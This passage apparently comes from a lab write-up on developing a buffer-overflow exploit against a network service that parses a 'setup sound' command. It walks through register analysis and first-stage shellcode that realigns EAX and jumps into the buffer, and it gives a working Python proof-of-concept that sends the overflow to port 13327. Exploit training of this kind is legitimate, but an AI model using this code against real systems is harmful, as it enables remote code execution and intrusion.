Now the most important step: Identify registers that point to our buffer at the time of crash. This will allow us to identify possible JMP or CALL instructiosn to redirect flow of execution to our buffer. 

We notice ESP points to the end of our buffer, leaving only seven bytes of shellcode space. 

We cannot increase the overflow buffer size, since every single byte increase produces a different crash that does not properly overwrite EIP.

Looking at other registers, we can see that EAX points to the beginning of our buffer, including the "setup sound" string. 

We may have issues jumping to the buffer pointed at by EAX, since the hex opcodes equivalent to the "setup sound" string may cause issues. 

Interestingly, we find that the "setup sound" instructions being with s=(\x73) and e=(\x65), which are translated as "conditional jump". The next two letters are another type of jump . All these jumps seem to lead in to our controlled buffer so this might actaully work.. but there is most likely a cleaner way. 

Continuing analysis, ESP points towards the end of our unique buffer. This gives us a few bytes to work with. 

Rather than put in a full reverse shell, we can use a "first stage" shellcode that will align the EAX register in order to make it point to our buffer right after the "setup sound" string, and jump to that location. This will allow us to skip the conditinal jumps. 

To make this happen, our first stage shellcode will need ot increase the value of EAX by 12 (\x0C) bytes, as there are 12 chars in "setup sound". This can be done using the ADD asm instruction and then proceed to jump to the memory pointed to by EAX using a JMP instruciton.

To get the correct opcodes for our instructions:
`msf-nasm_shell`
`add eax,12`
00000000 83C00C		   add eax,byte +0xc
`jmp eax`
00000000 FFE0			 jmp eax

These instructions (\x83\xc0\x0c\xff\xe0) only take up 5 bytes. Update the PoC to include payload and re-pad original buffer with NOPS (\x90) to maintain correct length. 

```
#!/usr/bin/python
import socket
host = "10.11.0.128"
padding = "\x41" * 4368
eip = "\x42\x42\x42\x42"
first_stage = "\x83\xc0\x0c\xff\xe0\x90\x90"
buffer = "\x11(setup sound " + padding + eip + first_stage + "\x90\x00#"
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
print "[*]Sending evil buffer..."
s.connect((host, 13327))
print s.recv(1024)
s.send(buffer)
s.close()
print "[*]Payload Sent!"
```

After runnig PoC, we see that EIP is overwritten with four B's (\x42) and ESP points to the memory address containing our first stage shellcode.

 

